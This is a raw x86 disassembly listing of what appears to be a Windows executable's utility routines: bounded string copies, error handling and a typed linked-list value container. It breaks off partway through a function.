  40ac17:	push   DWORD PTR [esi]
  40ac19:	push   0xc
  40ac1b:	push   eax
  40ac1c:	call   DWORD PTR ds:0x412048
  40ac22:	test   eax,eax
  40ac24:	jne    0x40ac41
  40ac26:	call   DWORD PTR ds:0x4120cc
  40ac2c:	test   eax,eax
  40ac2e:	jne    0x40ac38
  40ac30:	push   0x8
  40ac32:	call   DWORD PTR ds:0x412014
  40ac38:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40ac3f:	jmp    0x40ac96
  40ac41:	mov    DWORD PTR [esi],eax
  40ac43:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  40ac4a:	xor    eax,eax
  40ac4c:	inc    eax
  40ac4d:	jmp    0x40ac98
  40ac4f:	mov    eax,DWORD PTR [ebp-0x14]
  40ac52:	mov    eax,DWORD PTR [eax]
  40ac54:	mov    eax,DWORD PTR [eax]
  40ac56:	mov    DWORD PTR [ebp-0x1c],eax
  40ac59:	xor    eax,eax
  40ac5b:	inc    eax
  40ac5c:	ret    
  40ac5d:	mov    esp,DWORD PTR [ebp-0x18]
  40ac60:	cmp    DWORD PTR [ebp-0x1c],0xc0000017
  40ac67:	je     0x40ac26
  40ac69:	cmp    DWORD PTR [ebp-0x1c],0xc0000005
  40ac70:	jne    0x40ac26
  40ac72:	push   0x570
  40ac77:	call   DWORD PTR ds:0x412014
  40ac7d:	call   0x4095c0
  40ac82:	jmp    0x40ac38
  40ac84:	call   DWORD PTR ds:0x4120cc
  40ac8a:	test   eax,eax
  40ac8c:	jne    0x40ac96
  40ac8e:	push   0x57
  40ac90:	call   DWORD PTR ds:0x412014
  40ac96:	xor    eax,eax
  40ac98:	call   0x40e99d
  40ac9d:	ret    
  40ac9e:	int3   
  40ac9f:	int3   
  40aca0:	int3   
  40aca1:	int3   
  40aca2:	int3   
  40aca3:	mov    edi,edi
  40aca5:	push   esi
  40aca6:	mov    esi,ecx
  40aca8:	test   esi,esi
  40acaa:	jne    0x40acc3
  40acac:	call   DWORD PTR ds:0x4120cc
  40acb2:	test   eax,eax
  40acb4:	jne    0x40acbe
  40acb6:	push   0x57
  40acb8:	call   DWORD PTR ds:0x412014
  40acbe:	or     eax,0xffffffff
  40acc1:	pop    esi
  40acc2:	ret    
  40acc3:	call   0x40aadd
  40acc8:	test   eax,eax
  40acca:	je     0x40acbe
  40accc:	call   DWORD PTR ds:0x412058
  40acd2:	test   eax,eax
  40acd4:	je     0x40acbe
  40acd6:	push   esi
  40acd7:	push   0x0
  40acd9:	push   eax
  40acda:	call   DWORD PTR ds:0x412044
  40ace0:	pop    esi
  40ace1:	ret    
  40ace2:	int3   
  40ace3:	int3   
  40ace4:	int3   
  40ace5:	int3   
  40ace6:	int3   
  40ace7:	mov    edi,edi
  40ace9:	push   ebp
  40acea:	mov    ebp,esp
  40acec:	push   ebx
  40aced:	xor    eax,eax
  40acef:	mov    ebx,ecx
  40acf1:	push   esi
  40acf2:	mov    esi,eax
  40acf4:	test   edx,edx
  40acf6:	je     0x40ad00
  40acf8:	cmp    edx,0x7fffffff
  40acfe:	jbe    0x40ad05
  40ad00:	mov    esi,0x80070057
  40ad05:	test   esi,esi
  40ad07:	js     0x40ad46
  40ad09:	mov    ecx,edx
  40ad0b:	mov    esi,eax
  40ad0d:	push   edi
  40ad0e:	mov    edi,ebx
  40ad10:	test   edx,edx
  40ad12:	je     0x40ad2b
  40ad14:	cmp    WORD PTR [edi],ax
  40ad17:	je     0x40ad21
  40ad19:	add    edi,0x2
  40ad1c:	sub    ecx,0x1
  40ad1f:	jne    0x40ad14
  40ad21:	test   ecx,ecx
  40ad23:	je     0x40ad2b
  40ad25:	mov    eax,edx
  40ad27:	sub    eax,ecx
  40ad29:	jmp    0x40ad30
  40ad2b:	mov    esi,0x80070057
  40ad30:	pop    edi
  40ad31:	test   esi,esi
  40ad33:	js     0x40ad46
  40ad35:	push   ecx
  40ad36:	push   DWORD PTR [ebp+0x8]
  40ad39:	sub    edx,eax
  40ad3b:	push   ecx
  40ad3c:	lea    ecx,[ebx+eax*2]
  40ad3f:	call   0x40ad53
  40ad44:	mov    esi,eax
  40ad46:	mov    eax,esi
  40ad48:	pop    esi
  40ad49:	pop    ebx
  40ad4a:	pop    ebp
  40ad4b:	ret    0x4
  40ad4e:	int3   
  40ad4f:	int3   
  40ad50:	int3   
  40ad51:	int3   
  40ad52:	int3   
  40ad53:	mov    edi,edi
  40ad55:	push   ebp
  40ad56:	mov    ebp,esp
  40ad58:	push   edi
  40ad59:	xor    edi,edi
  40ad5b:	test   edx,edx
  40ad5d:	je     0x40ad8a
  40ad5f:	mov    eax,DWORD PTR [ebp+0xc]
  40ad62:	push   ebx
  40ad63:	push   esi
  40ad64:	mov    esi,0x7ffffffe
  40ad69:	sub    eax,ecx
  40ad6b:	test   esi,esi
  40ad6d:	je     0x40ad84
  40ad6f:	movzx  ebx,WORD PTR [eax+ecx*1]
  40ad73:	test   bx,bx
  40ad76:	je     0x40ad84
  40ad78:	mov    WORD PTR [ecx],bx
  40ad7b:	add    ecx,0x2
  40ad7e:	dec    esi
  40ad7f:	sub    edx,0x1
  40ad82:	jne    0x40ad6b
  40ad84:	pop    esi
  40ad85:	pop    ebx
  40ad86:	test   edx,edx
  40ad88:	jne    0x40ad92
  40ad8a:	sub    ecx,0x2
  40ad8d:	mov    edi,0x8007007a
  40ad92:	xor    eax,eax
  40ad94:	mov    WORD PTR [ecx],ax
  40ad97:	mov    eax,edi
  40ad99:	pop    edi
  40ad9a:	pop    ebp
  40ad9b:	ret    0xc
  40ad9e:	int3   
  40ad9f:	int3   
  40ada0:	int3   
  40ada1:	int3   
  40ada2:	int3   
  40ada3:	mov    edi,edi
  40ada5:	push   ebp
  40ada6:	mov    ebp,esp
  40ada8:	push   edi
  40ada9:	xor    edi,edi
  40adab:	test   edx,edx
  40adad:	je     0x40add5
  40adaf:	mov    eax,DWORD PTR [ebp+0xc]
  40adb2:	push   ebx
  40adb3:	push   esi
  40adb4:	mov    esi,0x7ffffffe
  40adb9:	sub    eax,ecx
  40adbb:	test   esi,esi
  40adbd:	je     0x40adcf
  40adbf:	mov    bl,BYTE PTR [eax+ecx*1]
  40adc2:	test   bl,bl
  40adc4:	je     0x40adcf
  40adc6:	mov    BYTE PTR [ecx],bl
  40adc8:	inc    ecx
  40adc9:	dec    esi
  40adca:	sub    edx,0x1
  40adcd:	jne    0x40adbb
  40adcf:	pop    esi
  40add0:	pop    ebx
  40add1:	test   edx,edx
  40add3:	jne    0x40addb
  40add5:	dec    ecx
  40add6:	mov    edi,0x8007007a
  40addb:	mov    eax,edi
  40addd:	mov    BYTE PTR [ecx],0x0
  40ade0:	pop    edi
  40ade1:	pop    ebp
  40ade2:	ret    0xc
  40ade5:	int3   
  40ade6:	int3   
  40ade7:	int3   
  40ade8:	int3   
  40ade9:	int3   
  40adea:	mov    edi,edi
  40adec:	push   ebp
  40aded:	mov    ebp,esp
  40adef:	mov    eax,DWORD PTR [ebp+0xc]
  40adf2:	xor    ecx,ecx
  40adf4:	test   eax,eax
  40adf6:	je     0x40adff
  40adf8:	cmp    eax,0x7fffffff
  40adfd:	jbe    0x40ae04
  40adff:	mov    ecx,0x80070057
  40ae04:	test   ecx,ecx
  40ae06:	js     0x40ae1e
  40ae08:	lea    ecx,[ebp+0x14]
  40ae0b:	mov    edx,eax
  40ae0d:	push   ecx
  40ae0e:	push   DWORD PTR [ebp+0x10]
  40ae11:	push   ecx
  40ae12:	mov    ecx,DWORD PTR [ebp+0x8]
  40ae15:	call   0x40ae33
  40ae1a:	mov    ecx,eax
  40ae1c:	jmp    0x40ae2a
  40ae1e:	test   eax,eax
  40ae20:	je     0x40ae2a
  40ae22:	mov    eax,DWORD PTR [ebp+0x8]
  40ae25:	xor    edx,edx
  40ae27:	mov    WORD PTR [eax],dx
  40ae2a:	mov    eax,ecx
  40ae2c:	pop    ebp
  40ae2d:	ret    
  40ae2e:	int3   
  40ae2f:	int3   
  40ae30:	int3   
  40ae31:	int3   
  40ae32:	int3   
  40ae33:	mov    edi,edi
  40ae35:	push   ebp
  40ae36:	mov    ebp,esp
  40ae38:	push   ebx
  40ae39:	push   esi
  40ae3a:	push   edi
  40ae3b:	push   DWORD PTR [ebp+0x10]
  40ae3e:	lea    esi,[edx-0x1]
  40ae41:	mov    edi,ecx
  40ae43:	push   DWORD PTR [ebp+0xc]
  40ae46:	xor    ebx,ebx
  40ae48:	push   esi
  40ae49:	push   edi
  40ae4a:	call   DWORD PTR ds:0x41224c
  40ae50:	add    esp,0x10
  40ae53:	test   eax,eax
  40ae55:	js     0x40ae5f
  40ae57:	cmp    eax,esi
  40ae59:	ja     0x40ae5f
  40ae5b:	jne    0x40ae6a
  40ae5d:	jmp    0x40ae64
  40ae5f:	mov    ebx,0x8007007a
  40ae64:	xor    eax,eax
  40ae66:	mov    WORD PTR [edi+esi*2],ax
  40ae6a:	pop    edi
  40ae6b:	pop    esi
  40ae6c:	mov    eax,ebx
  40ae6e:	pop    ebx
  40ae6f:	pop    ebp
  40ae70:	ret    0xc
  40ae73:	int3   
  40ae74:	int3   
  40ae75:	int3   
  40ae76:	int3   
  40ae77:	int3   
  40ae78:	mov    edi,edi
  40ae7a:	push   ebp
  40ae7b:	mov    ebp,esp
  40ae7d:	xor    eax,eax
  40ae7f:	test   edx,edx
  40ae81:	je     0x40ae8b
  40ae83:	cmp    edx,0x7fffffff
  40ae89:	jbe    0x40ae90
  40ae8b:	mov    eax,0x80070057
  40ae90:	test   eax,eax
  40ae92:	js     0x40aea2
  40ae94:	push   DWORD PTR [ebp+0xc]
  40ae97:	push   DWORD PTR [ebp+0x8]
  40ae9a:	push   ecx
  40ae9b:	call   0x40ae33
  40aea0:	jmp    0x40aeab
  40aea2:	test   edx,edx
  40aea4:	je     0x40aeab
  40aea6:	xor    edx,edx
  40aea8:	mov    WORD PTR [ecx],dx
  40aeab:	pop    ebp
  40aeac:	ret    0x8
  40aeaf:	int3   
  40aeb0:	int3   
  40aeb1:	int3   
  40aeb2:	int3   
  40aeb3:	int3   
  40aeb4:	mov    edi,edi
  40aeb6:	push   ebp
  40aeb7:	mov    ebp,esp
  40aeb9:	call   0x40b10f
  40aebe:	test   eax,eax
  40aec0:	jne    0x40aec6
  40aec2:	xor    eax,eax
  40aec4:	jmp    0x40aeea
  40aec6:	cmp    DWORD PTR [ecx+0x4],edx
  40aec9:	jbe    0x40aec2
  40aecb:	mov    eax,DWORD PTR [ecx+0x8]
  40aece:	push   esi
  40aecf:	xor    esi,esi
  40aed1:	cmp    edx,0x1
  40aed4:	jb     0x40aee0
  40aed6:	mov    esi,eax
  40aed8:	mov    eax,DWORD PTR [eax+0x10]
  40aedb:	sub    edx,0x1
  40aede:	jne    0x40aed6
  40aee0:	mov    ecx,DWORD PTR [ebp+0x8]
  40aee3:	test   ecx,ecx
  40aee5:	je     0x40aee9
  40aee7:	mov    DWORD PTR [ecx],esi
  40aee9:	pop    esi
  40aeea:	pop    ebp
  40aeeb:	ret    0x4
  40aeee:	int3   
  40aeef:	int3   
  40aef0:	int3   
  40aef1:	int3   
  40aef2:	int3   
  40aef3:	mov    edi,edi
  40aef5:	push   ebp
  40aef6:	mov    ebp,esp
  40aef8:	push   esi
  40aef9:	push   edi
  40aefa:	mov    edi,edx
  40aefc:	mov    esi,ecx
  40aefe:	call   0x40b10f
  40af03:	test   eax,eax
  40af05:	jne    0x40af0c
  40af07:	or     eax,0xffffffff
  40af0a:	jmp    0x40af54
  40af0c:	cmp    DWORD PTR [esi+0x4],0xffffffff
  40af10:	je     0x40af07
  40af12:	push   0x14
  40af14:	pop    ecx
  40af15:	call   0x40ab1d
  40af1a:	mov    ecx,eax
  40af1c:	test   ecx,ecx
  40af1e:	je     0x40af07
  40af20:	mov    eax,DWORD PTR [ebp+0x8]
  40af23:	and    DWORD PTR [ecx+0x10],0x0
  40af27:	mov    DWORD PTR [ecx+0x8],eax
  40af2a:	mov    eax,DWORD PTR [ebp+0xc]
  40af2d:	mov    DWORD PTR [ecx+0x4],edi
  40af30:	mov    DWORD PTR [ecx+0xc],eax
  40af33:	mov    DWORD PTR [ecx],0x63
  40af39:	inc    DWORD PTR [esi+0x4]
  40af3c:	cmp    DWORD PTR [esi+0x8],0x0
  40af40:	jne    0x40af47
  40af42:	mov    DWORD PTR [esi+0x8],ecx
  40af45:	jmp    0x40af4d
  40af47:	mov    eax,DWORD PTR [esi+0xc]
  40af4a:	mov    DWORD PTR [eax+0x10],ecx
  40af4d:	mov    eax,DWORD PTR [esi+0x4]
  40af50:	mov    DWORD PTR [esi+0xc],ecx
  40af53:	dec    eax
  40af54:	pop    edi
  40af55:	pop    esi
  40af56:	pop    ebp
  40af57:	ret    0x8
  40af5a:	int3   
  40af5b:	int3   
  40af5c:	int3   
  40af5d:	int3   
  40af5e:	int3   
  40af5f:	mov    edi,edi
  40af61:	push   ebp
  40af62:	mov    ebp,esp
  40af64:	push   esi
  40af65:	mov    esi,ecx
  40af67:	call   0x40b10f
  40af6c:	test   eax,eax
  40af6e:	jne    0x40af75
  40af70:	or     eax,0xffffffff
  40af73:	jmp    0x40afcd
  40af75:	cmp    DWORD PTR [esi+0x4],0xffffffff
  40af79:	je     0x40af70
  40af7b:	cmp    DWORD PTR [esi+0x4],0x0
  40af7f:	ja     0x40af93
  40af81:	push   DWORD PTR [ebp+0x10]
  40af84:	mov    edx,0x20000
  40af89:	push   DWORD PTR [ebp+0xc]
  40af8c:	call   0x40aef3
  40af91:	jmp    0x40afcd
  40af93:	push   0x14
  40af95:	pop    ecx
  40af96:	call   0x40ab1d
  40af9b:	mov    ecx,eax
  40af9d:	test   ecx,ecx
  40af9f:	je     0x40af70
  40afa1:	and    DWORD PTR [ecx+0x10],0x0
  40afa5:	mov    eax,DWORD PTR [ebp+0xc]
  40afa8:	mov    DWORD PTR [ecx+0x8],eax
  40afab:	mov    eax,DWORD PTR [ebp+0x10]
  40afae:	mov    DWORD PTR [ecx+0xc],eax
  40afb1:	mov    DWORD PTR [ecx+0x4],0x20000
  40afb8:	mov    DWORD PTR [ecx],0x63
  40afbe:	mov    eax,DWORD PTR [esi+0x8]
  40afc1:	inc    DWORD PTR [esi+0x4]
  40afc4:	mov    DWORD PTR [ecx+0x10],eax
  40afc7:	xor    eax,eax
  40afc9:	mov    DWORD PTR [esi+0x8],ecx
  40afcc:	inc    eax
  40afcd:	pop    esi
  40afce:	pop    ebp
  40afcf:	ret    0xc
  40afd2:	int3   
  40afd3:	int3   
  40afd4:	int3   
  40afd5:	int3   
  40afd6:	int3   
  40afd7:	test   ecx,ecx
  40afd9:	je     0x40b040
  40afdb:	mov    eax,DWORD PTR [ecx+0x4]
  40afde:	mov    edx,0x70000
  40afe3:	cmp    eax,edx
  40afe5:	ja     0x40b00d
  40afe7:	je     0x40b029
  40afe9:	cmp    eax,0x20000
  40afee:	je     0x40b029
  40aff0:	cmp    eax,0x30000
  40aff5:	je     0x40b029
  40aff7:	cmp    eax,0x40000
  40affc:	je     0x40b029
  40affe:	cmp    eax,0x50000
  40b003:	je     0x40b029
  40b005:	cmp    eax,0x60000
  40b00a:	je     0x40b029
  40b00c:	ret    
  40b00d:	cmp    eax,0x80000
  40b012:	je     0x40b031
  40b014:	cmp    eax,0x90000
  40b019:	je     0x40b029
  40b01b:	cmp    eax,0xa0000
  40b020:	je     0x40b029
  40b022:	cmp    eax,0xb0000
  40b027:	jne    0x40b040
  40b029:	add    ecx,0xc
  40b02c:	jmp    0x40aa69
  40b031:	push   esi
  40b032:	lea    esi,[ecx+0xc]
  40b035:	mov    ecx,esi
  40b037:	call   0x40b196
  40b03c:	and    DWORD PTR [esi],0x0
  40b03f:	pop    esi
  40b040:	ret    
  40b041:	int3   
  40b042:	int3   
  40b043:	int3   
  40b044:	int3   
  40b045:	int3   
  40b046:	mov    edi,edi
  40b048:	push   ebp
  40b049:	mov    ebp,esp
  40b04b:	push   ecx
  40b04c:	push   ebx
  40b04d:	mov    ebx,edx
  40b04f:	mov    DWORD PTR [ebp-0x4],ecx
  40b052:	call   0x40b10f
  40b057:	test   eax,eax
  40b059:	jne    0x40b063
  40b05b:	or     eax,0xffffffff
  40b05e:	jmp    0x40b103
  40b063:	push   esi
  40b064:	xor    esi,esi
  40b066:	push   edi
  40b067:	mov    edi,DWORD PTR [ecx+0x8]
  40b06a:	cmp    DWORD PTR [ecx+0x4],esi
  40b06d:	jbe    0x40b0fe
  40b073:	mov    edx,DWORD PTR [ebp+0x8]
  40b076:	cmp    DWORD PTR [edi+0x4],ebx
  40b079:	jne    0x40b0f1
  40b07b:	cmp    ebx,0x70000
  40b081:	je     0x40b0db
  40b083:	cmp    ebx,0x20000
  40b089:	je     0x40b0c2
  40b08b:	cmp    ebx,0x30000
  40b091:	je     0x40b0b7
  40b093:	cmp    ebx,0x40000
  40b099:	je     0x40b0b7
  40b09b:	cmp    ebx,0x60000
  40b0a1:	jne    0x40b0f1
  40b0a3:	mov    eax,DWORD PTR [edi+0xc]
  40b0a6:	fld    DWORD PTR [eax]
  40b0a8:	fld    DWORD PTR [edx]
  40b0aa:	fucompp 
  40b0ac:	fnstsw ax
  40b0ae:	test   ah,0x44
  40b0b1:	jp     0x40b0f1
  40b0b3:	mov    eax,esi
  40b0b5:	jmp    0x40b101
  40b0b7:	mov    eax,DWORD PTR [edi+0xc]
  40b0ba:	mov    eax,DWORD PTR [eax]
  40b0bc:	cmp    eax,DWORD PTR [edx]
  40b0be:	je     0x40b0b3
  40b0c0:	jmp    0x40b0f1
  40b0c2:	mov    edx,DWORD PTR [ebp+0x8]
  40b0c5:	mov    ecx,DWORD PTR [edi+0xc]
  40b0c8:	push   0x0
  40b0ca:	push   DWORD PTR [ebp+0xc]
  40b0cd:	call   0x40a31f
  40b0d2:	test   eax,eax
  40b0d4:	je     0x40b0b3
  40b0d6:	mov    ecx,DWORD PTR [ebp-0x4]
  40b0d9:	jmp    0x40b0ee
  40b0db:	mov    eax,DWORD PTR [edi+0xc]
  40b0de:	fld    QWORD PTR [eax]
  40b0e0:	mov    eax,DWORD PTR [ebp+0x8]
  40b0e3:	fld    QWORD PTR [eax]
  40b0e5:	fucompp 
  40b0e7:	fnstsw ax
  40b0e9:	test   ah,0x44
  40b0ec:	jnp    0x40b0b3
  40b0ee:	mov    edx,DWORD PTR [ebp+0x8]
  40b0f1:	mov    edi,DWORD PTR [edi+0x10]
  40b0f4:	inc    esi
  40b0f5:	cmp    esi,DWORD PTR [ecx+0x4]
  40b0f8:	jb     0x40b076
  40b0fe:	or     eax,0xffffffff
  40b101:	pop    edi
  40b102:	pop    esi
  40b103:	pop    ebx
  40b104:	mov    esp,ebp
  40b106:	pop    ebp
  40b107:	ret    0xc
  40b10a:	int3   
  40b10b:	int3   
  40b10c:	int3   
  40b10d:	int3   
  40b10e:	int3   
  40b10f:	test   ecx,ecx
  40b111:	je     0x40b11c
  40b113:	cmp    DWORD PTR [ecx],0x9
  40b116:	jne    0x40b11c
  40b118:	xor    eax,eax
  40b11a:	inc    eax
  40b11b:	ret    
  40b11c:	xor    eax,eax
  40b11e:	ret    
  40b11f:	int3   
  40b120:	int3   
  40b121:	int3   
  40b122:	int3   
  40b123:	int3   
  40b124:	push   0x10
  40b126:	pop    ecx
  40b127:	call   0x40ab1d
  40b12c:	test   eax,eax
  40b12e:	jne    0x40b131
  40b130:	ret    
  40b131:	xor    ecx,ecx
  40b133:	mov    DWORD PTR [eax],0x9
  40b139:	mov    DWORD PTR [eax+0x4],ecx
  40b13c:	mov    DWORD PTR [eax+0x8],ecx
  40b13f:	mov    DWORD PTR [eax+0xc],ecx
  40b142:	ret    
  40b143:	int3   
  40b144:	int3   
  40b145:	int3   
  40b146:	int3   
  40b147:	int3   
  40b148:	mov    edi,edi
  40b14a:	push   ebp
  40b14b:	mov    ebp,esp
  40b14d:	push   ecx
  40b14e:	push   edi
  40b14f:	mov    edi,ecx
  40b151:	call   0x40b10f
  40b156:	test   eax,eax
  40b158:	je     0x40b18c
  40b15a:	mov    eax,DWORD PTR [edi+0x8]
  40b15d:	mov    DWORD PTR [ebp-0x4],eax
  40b160:	test   eax,eax
  40b162:	je     0x40b181
  40b164:	push   esi
  40b165:	mov    esi,DWORD PTR [eax+0x10]
  40b168:	mov    ecx,eax
  40b16a:	call   0x40afd7
  40b16f:	lea    ecx,[ebp-0x4]
  40b172:	call   0x40aa69
  40b177:	mov    eax,esi
  40b179:	mov    DWORD PTR [ebp-0x4],eax
  40b17c:	test   esi,esi
  40b17e:	jne    0x40b165
  40b180:	pop    esi
  40b181:	xor    eax,eax
  40b183:	mov    DWORD PTR [edi+0x4],eax
  40b186:	mov    DWORD PTR [edi+0x8],eax
  40b189:	mov    DWORD PTR [edi+0xc],eax
  40b18c:	pop    edi
  40b18d:	mov    esp,ebp
  40b18f:	pop    ebp
  40b190:	ret    
  40b191:	int3   
  40b192:	int3   
  40b193:	int3   
  40b194:	int3   
  40b195:	int3   
  40b196:	mov    edi,edi
  40b198:	push   esi
  40b199:	mov    esi,ecx
  40b19b:	mov    ecx,DWORD PTR [esi]
  40b19d:	call   0x40b10f
  40b1a2:	test   eax,eax
  40b1a4:	je     0x40b1b3
  40b1a6:	call   0x40b148
  40b1ab:	mov    ecx,esi
  40b1ad:	pop    esi
  40b1ae:	jmp    0x40aa69
  40b1b3:	pop    esi
  40b1b4:	ret    
  40b1b5:	int3   
  40b1b6:	int3   
  40b1b7:	int3   
  40b1b8:	int3   
  40b1b9:	int3   
  40b1ba:	mov    edi,edi
  40b1bc:	push   ebp
  40b1bd:	mov    ebp,esp
  40b1bf:	push   ecx
  40b1c0:	push   ecx
  40b1c1:	push   ebx
  40b1c2:	mov    DWORD PTR [ebp-0x4],edx
  40b1c5:	mov    ebx,ecx
  40b1c7:	call   0x40b10f
  40b1cc:	test   eax,eax
  40b1ce:	jne    0x40b1d5
  40b1d0:	or     eax,0xffffffff
  40b1d3:	jmp    0x40b220
  40b1d5:	push   esi
  40b1d6:	push   edi
  40b1d7:	push   edx
  40b1d8:	call   DWORD PTR ds:0x4120c4
  40b1de:	lea    esi,[eax+0x1]
  40b1e1:	lea    ecx,[esi+esi*1]
  40b1e4:	call   0x40ab1d
  40b1e9:	mov    edi,eax
  40b1eb:	mov    DWORD PTR [ebp-0x8],edi
  40b1ee:	test   edi,edi
  40b1f0:	je     0x40b21b
  40b1f2:	mov    edx,DWORD PTR [ebp-0x4]
  40b1f5:	mov    ecx,edi
  40b1f7:	push   esi
  40b1f8:	call   0x40a26c
  40b1fd:	push   edi
  40b1fe:	lea    eax,[esi+esi*1]
  40b201:	mov    edx,0x20000
  40b206:	push   eax
  40b207:	mov    ecx,ebx
  40b209:	call   0x40aef3
  40b20e:	cmp    eax,0xffffffff
  40b211:	jne    0x40b21e
  40b213:	lea    ecx,[ebp-0x8]
  40b216:	call   0x40aa69
  40b21b:	or     eax,0xffffffff
  40b21e:	pop    edi
  40b21f:	pop    esi
  40b220:	pop    ebx
  40b221:	mov    esp,ebp
  40b223:	pop    ebp
  40b224:	ret    0x4
  40b227:	int3   
  40b228:	int3   
  40b229:	int3   
  40b22a:	int3   
  40b22b:	int3   
  40b22c:	mov    edi,edi
  40b22e:	push   ebp
  40b22f:	mov    ebp,esp
  40b231:	push   ecx
  40b232:	push   esi
  40b233:	push   edi
  40b234:	mov    edi,edx
  40b236:	mov    esi,ecx
  40b238:	call   0x40b10f
  40b23d:	test   eax,eax
  40b23f:	je     0x40b26e
  40b241:	push   0x4
  40b243:	pop    ecx
  40b244:	call   0x40ab1d
  40b249:	mov    DWORD PTR [ebp-0x4],eax
  40b24c:	test   eax,eax
  40b24e:	je     0x40b26e
  40b250:	push   eax
  40b251:	push   0x4
  40b253:	mov    edx,0x30000
  40b258:	mov    DWORD PTR [eax],edi
  40b25a:	mov    ecx,esi
  40b25c:	call   0x40aef3
  40b261:	cmp    eax,0xffffffff
  40b264:	jne    0x40b271
  40b266:	lea    ecx,[ebp-0x4]
  40b269:	call   0x40aa69
  40b26e:	or     eax,0xffffffff
  40b271:	pop    edi
  40b272:	pop    esi
  40b273:	mov    esp,ebp
  40b275:	pop    ebp
  40b276:	ret    
  40b277:	int3   
  40b278:	int3   
  40b279:	int3   
  40b27a:	int3   
  40b27b:	int3   
  40b27c:	mov    edi,edi
  40b27e:	push   ebp
  40b27f:	mov    ebp,esp
  40b281:	push   ecx
  40b282:	push   esi
  40b283:	push   edi
  40b284:	mov    edi,edx
  40b286:	mov    esi,ecx
  40b288:	call   0x40b10f
  40b28d:	test   eax,eax
  40b28f:	je     0x40b2be
  40b291:	push   0x4
  40b293:	pop    ecx
  40b294:	call   0x40ab1d
  40b299:	mov    DWORD PTR [ebp-0x4],eax
  40b29c:	test   eax,eax
  40b29e:	je     0x40b2be
  40b2a0:	push   eax
  40b2a1:	push   0x4
  40b2a3:	mov    edx,0x40000
  40b2a8:	mov    DWORD PTR [eax],edi
  40b2aa:	mov    ecx,esi
  40b2ac:	call   0x40aef3
  40b2b1:	cmp    eax,0xffffffff
  40b2b4:	jne    0x40b2c1
  40b2b6:	lea    ecx,[ebp-0x4]
  40b2b9:	call   0x40aa69
  40b2be:	or     eax,0xffffffff
  40b2c1:	pop    edi
  40b2c2:	pop    esi
  40b2c3:	mov    esp,ebp
  40b2c5:	pop    ebp
  40b2c6:	ret    
  40b2c7:	int3   
  40b2c8:	int3   
  40b2c9:	int3   
  40b2ca:	int3   
  40b2cb:	int3   
  40b2cc:	mov    edi,edi
  40b2ce:	push   ebp
  40b2cf:	mov    ebp,esp
  40b2d1:	push   ecx
  40b2d2:	push   esi
  40b2d3:	mov    esi,ecx
  40b2d5:	call   0x40b10f
  40b2da:	test   eax,eax
  40b2dc:	je     0x40b30e
  40b2de:	push   0x4
  40b2e0:	pop    ecx
  40b2e1:	call   0x40ab1d
  40b2e6:	mov    DWORD PTR [ebp-0x4],eax
  40b2e9:	test   eax,eax
  40b2eb:	je     0x40b30e
  40b2ed:	fld    DWORD PTR [ebp+0x8]
  40b2f0:	mov    edx,0x60000
  40b2f5:	push   eax
  40b2f6:	push   0x4
  40b2f8:	mov    ecx,esi
  40b2fa:	fstp   DWORD PTR [eax]
  40b2fc:	call   0x40aef3
  40b301:	cmp    eax,0xffffffff
  40b304:	jne    0x40b311
  40b306:	lea    ecx,[ebp-0x4]
  40b309:	call   0x40aa69
  40b30e:	or     eax,0xffffffff
  40b311:	pop    esi
  40b312:	mov    esp,ebp
  40b314:	pop    ebp
  40b315:	ret    0x4
  40b318:	int3   
  40b319:	int3   
  40b31a:	int3   
  40b31b:	int3   
  40b31c:	int3   
  40b31d:	mov    edi,edi
  40b31f:	push   ebp
  40b320:	mov    ebp,esp
  40b322:	push   ecx
  40b323:	push   esi
  40b324:	mov    esi,ecx
  40b326:	call   0x40b10f
  40b32b:	test   eax,eax
  40b32d:	je     0x40b35f
  40b32f:	push   0x8
  40b331:	pop    ecx
  40b332:	call   0x40ab1d
  40b337:	mov    DWORD PTR [ebp-0x4],eax
  40b33a:	test   eax,eax
  40b33c:	je     0x40b35f
  40b33e:	fld    QWORD PTR [ebp+0x8]
  40b341:	mov    edx,0x70000
  40b346:	push   eax
  40b347:	push   0x8
  40b349:	mov    ecx,esi
  40b34b:	fstp   QWORD PTR [eax]
  40b34d:	call   0x40aef3
  40b352:	cmp    eax,0xffffffff
  40b355:	jne    0x40b362
  40b357:	lea    ecx,[ebp-0x4]
  40b35a:	call   0x40aa69
  40b35f:	or     eax,0xffffffff
  40b362:	pop    esi
  40b363:	mov    esp,ebp
  40b365:	pop    ebp
  40b366:	ret    0x8
  40b369:	int3   
  40b36a:	int3   
  40b36b:	int3   
  40b36c:	int3   
  40b36d:	int3   
  40b36e:	mov    edi,edi
  40b370:	push   ebp
  40b371:	mov    ebp,esp
  40b373:	push   ecx
  40b374:	push   ecx
  40b375:	mov    eax,ecx
  40b377:	push   ebx
  40b378:	mov    ebx,edx
  40b37a:	mov    DWORD PTR [ebp-0x8],eax
  40b37d:	call   0x40b10f
  40b382:	test   eax,eax
  40b384:	jne    0x40b38b
  40b386:	or     eax,0xffffffff
  40b389:	jmp    0x40b3e5
  40b38b:	push   edi
  40b38c:	call   0x40b124
  40b391:	mov    edi,eax
  40b393:	mov    ecx,edi
  40b395:	mov    DWORD PTR [ebp-0x4],edi
  40b398:	call   0x40b10f
  40b39d:	test   eax,eax
  40b39f:	je     0x40b3e1
  40b3a1:	push   esi
  40b3a2:	xor    esi,esi
  40b3a4:	test   ebx,ebx
  40b3a6:	je     0x40b3bf
  40b3a8:	push   0x0
  40b3aa:	push   0x0
  40b3ac:	xor    edx,edx
  40b3ae:	mov    ecx,edi
  40b3b0:	call   0x40aef3
  40b3b5:	cmp    eax,0xffffffff
  40b3b8:	je     0x40b3bf
  40b3ba:	inc    esi
  40b3bb:	cmp    esi,ebx
  40b3bd:	jb     0x40b3a8
  40b3bf:	cmp    esi,ebx
  40b3c1:	pop    esi
  40b3c2:	jne    0x40b3d9
  40b3c4:	mov    ecx,DWORD PTR [ebp-0x8]
  40b3c7:	mov    edx,0x80000
  40b3cc:	push   edi
  40b3cd:	push   0x4
  40b3cf:	call   0x40aef3
  40b3d4:	cmp    eax,0xffffffff
  40b3d7:	jne    0x40b3e4
  40b3d9:	lea    ecx,[ebp-0x4]
  40b3dc:	call   0x40b196
  40b3e1:	or     eax,0xffffffff
  40b3e4:	pop    edi
  40b3e5:	pop    ebx
  40b3e6:	mov    esp,ebp
  40b3e8:	pop    ebp
  40b3e9:	ret    
  40b3ea:	int3   
  40b3eb:	int3   
  40b3ec:	int3   
  40b3ed:	int3   
  40b3ee:	int3   
  40b3ef:	mov    edi,edi
  40b3f1:	push   ebx
